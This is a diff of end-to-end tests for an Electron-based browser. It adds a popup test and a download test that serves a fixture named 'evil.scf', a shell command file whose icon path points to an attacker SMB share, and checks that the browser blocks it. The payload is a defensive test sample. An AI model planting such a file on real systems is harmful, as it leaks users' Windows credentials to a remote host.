@@ -32,6 +32,12 @@ function startServer(): Promise<{ server: Server; baseUrl: string }> {
       if (url === '/opener') {
         return html('<a id="l" href="/c" style="display:block;width:100vw;height:100vh">link</a>', 'opener');
       }
+      if (url === '/evil.scf') {
+        res.setHeader('Content-Type', 'application/octet-stream');
+        res.setHeader('Content-Disposition', 'attachment; filename="evil.scf"');
+        res.end('[Shell]\nIconFile=\\\\attacker\\share\\x.ico');
+        return;
+      }
       if (url === '/file.bin') {
         res.setHeader('Content-Type', 'application/octet-stream');
         res.setHeader('Content-Disposition', 'attachment; filename="file.bin"');
@@ -155,6 +161,14 @@ test.describe('M16 browser essentials', () => {
         expect(existsSync(join(dir, 'file.bin'))).toBe(true);
         expect(existsSync(join(dir, 'file (1).bin'))).toBe(true);
         await expect(page.getByTestId('topbar-downloads-toggle')).toBeVisible();
+
+        // Shortcut / shell-handler types are refused and never written.
+        await page.evaluate(async (url) => {
+          const s = await window.sidebrowser.requestTabsSnapshot();
+          await window.sidebrowser.navigate(s.activeId!, url);
+        }, `${base}/evil.scf`);
+        await expect(page.locator('[data-testid="download-item"][data-state="blocked"]')).toHaveCount(1, { timeout: 10_000 });
+        expect(existsSync(join(dir, 'evil.scf'))).toBe(false);
       }, { SIDEBROWSER_E2E_DOWNLOADS_DIR: dir });
     } finally {
       rmSync(dir, { recursive: true, force: true });
@@ -203,6 +217,18 @@ test.describe('M16 browser essentials', () => {
         return p ? ((await p.webContents.executeJavaScript('!!window.opener')) as boolean) : null;
       });
       expect(hasOpener).toBe(true);
+      expect((await snapshot(page)).tabs).toHaveLength(1);
+    });
+  });
+
+  test("window.open('') with features is a real popup too", async () => {
+    await withApp(async (app, page, base) => {
+      await navigateActive(page, `${base}/a`, app);
+      await activeEval(app, "window.__p = window.open('', 'p', 'width=400,height=500'); !!window.__p", true);
+      await expect
+        .poll(() => app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length), { timeout: 10_000 })
+        .toBe(2);
+      expect(await activeEval<boolean>(app, '!!window.__p && !window.__p.closed')).toBe(true);
       expect((await snapshot(page)).tabs).toHaveLength(1);
     });
   });
